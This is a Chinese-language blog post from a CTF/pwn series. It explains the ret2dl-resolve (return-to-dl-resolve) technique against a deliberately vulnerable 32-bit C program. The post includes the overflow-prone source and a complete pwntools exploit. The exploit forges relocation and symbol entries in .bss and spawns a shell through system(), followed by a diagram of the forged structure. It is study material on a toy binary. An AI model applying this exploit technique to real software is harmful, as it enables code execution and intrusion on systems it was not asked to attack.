---
layout:     post   			        # 使用的布局（不需要改）
title:      高阶rop之   			# 标题 
subtitle:   Return-to-dl-resolve逆向理解系列  #副标题
date:       2019-08-26 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

感觉这个和rop没什么太大关系，主要是理解延迟绑定之类的东西，本篇主要参考**五千年木**(真的感谢)大佬的[文章](https://www.cnblogs.com/elvirangel/p/8994799.html),并对最后exp作出了相对简洁的修改,下面写一下今天的收获

```
//gcc x86.c -fno-stack-protector -m32 -o x86
#include <unistd.h>
#include <string.h>
char gift[0x200];
void fun(){
    char buffer[0x20];
    read(0,buffer,0x200);
}
int main(){
    fun();
    return 0;
}
```
大佬已经写好了,我们研究一下利用思路,当然这个栈溢出很容易发现,我们就想直接rop,但是我们需要接触到一个比较高阶的知识点,即利用`_dl_runtime_resolve`,我们首先得学习**延迟绑定**(Lazy Binding),这个网上都有的讲,我们学习完后应该了解函数内部走过的步骤,下面我们根据exp来学习一下

## exp
```
from pwn import*
p = process('./x86')
context.log_level = 'debug'
elf = ELF('./x86')
gift = 0x0804A040#bss

payload = 0x28*'a' + 4*'a'
payload +=  p32(elf.plt['read']) + p32(0x0804840B)#fun_addr
payload += p32(0) + p32(gift) + p32(17*4)

p.sendline(payload)

payload = ''
payload += p32(0x0804a00c) + p32(0x1e807)
payload += p32(0)+p32(0x1e44)
payload += p32(0) *4
payload += 'system\x00\x00'
payload += '/bin/bash\x00'
p.sendline(payload)

payload = 0x28*'a' + 4*'a'
payload += p32(0x080482D0) + p32(0x1da8) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + 'sh'
p.sendline(payload)

p.interactive()
```
我们简单看一下溢出过程,第一处**payload**,先 **read(0,bss_addr,buf_size)** 把我们的**gift**构造好,之后再跳转到**fun()**,又让我们输入即第三个**payload**,溢出时写的 **0x80482d0** (内容:push   DWORD PTR ds:0x804a004),我们之前的`push 0`被我们自己写的`0x1da8`替代了,所以函数大概是` _dl_runtime_resolve(ds:0x804a004,0x1da8)`,之后一个垃圾数据做填充后填入system的参数即可完成本次攻击,下面我们深入分析一下**gift**

## gift
```
	0x0804a00c
	0x1e807-------
	0            |
------- 0x1e44 <------
|	0
|	0
|	0
|	0
------> syst
	em
	/bin/sh
```
看到这个应该就了解了,我们的2处指向使其指向了system,但是要注意,经过本人测试,第一个数据在`0x0804a000~0x0804affc`都可完成操作
